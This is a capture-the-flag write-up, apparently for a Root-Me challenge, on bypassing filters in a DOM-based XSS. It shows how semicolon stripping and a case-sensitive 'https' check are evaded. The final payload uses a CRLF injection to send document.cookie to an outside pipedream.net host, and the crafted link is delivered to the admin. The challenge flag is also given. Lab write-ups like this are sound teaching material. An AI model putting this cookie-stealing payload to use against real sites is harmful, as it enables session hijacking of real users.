# XSS DOM Based - Filters Bypass

In this chall, you won't have to guess the correct number because you will be rewarded nothing. So we will find a way to reward ourselves :D

![anh1]()

I tried to close the single quotes first, then used `;` to end the current javascript command and used alert(1) to check if the page is vulnerable to XSS or not. I entered `a'; alert(1); // ` into the input field.

Then nothing happened so I checked for the sources

![anh2]()

As you can see, the `;` is deleted so I couldn't end the current command and `alert(1)` wouldn't be triggered. Then I tried using `\r\n` and this page seems to be vulnerable.

![anh3]()

Next, I tried to send the cookie to my current server on requestbin. But when I entered `document.location=”https:// eovasfu0mdllq4f.m.pipedream.net”;`, the page told me that

![anh4]()

I changed `https` to `hTTps` to check if the XSS is triggered or not. Fortunately, the challenge doesn't check for case intensitive. So I was able to solve this challenge using the payload below:

```javascript

a'%0D%0Adocument.location='hTTps://eovasfu0mdllq4f.m.pipedream.net/?'.concat(document.cookie)//

```

I used this payload on the main page, then I grabbed the url and send it to admin. Now I think you already know what will happen next :D

![anh5]()

Flag is `rootme{FilTERS_ByPass_DOm_BASEd_XSS}`

![anh6]()